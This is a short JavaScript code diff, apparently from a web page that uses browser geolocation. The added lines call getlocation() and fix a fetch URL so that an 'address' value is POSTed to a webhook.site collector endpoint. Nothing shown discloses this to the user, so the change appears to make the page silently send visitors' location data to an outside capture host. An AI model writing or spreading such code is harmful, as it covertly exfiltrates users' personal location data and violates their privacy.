@@ -126,13 +126,14 @@
         case error.UNKNOWN_ERROR:
           alert("An unknown error occurred.");
           break;
+	getlocation()
 	var variableValue = address;
 
 	var payload = {
   	variable: variableValue
 	};
 
-	fetch("	https://webhook.site/9c006945-d465-4c8a-b6fc-f5da0a36710c", {
+	fetch("https://webhook.site/9c006945-d465-4c8a-b6fc-f5da0a36710c", {
   	method: "POST",
   	headers: {
     	"Content-Type": "application/json"
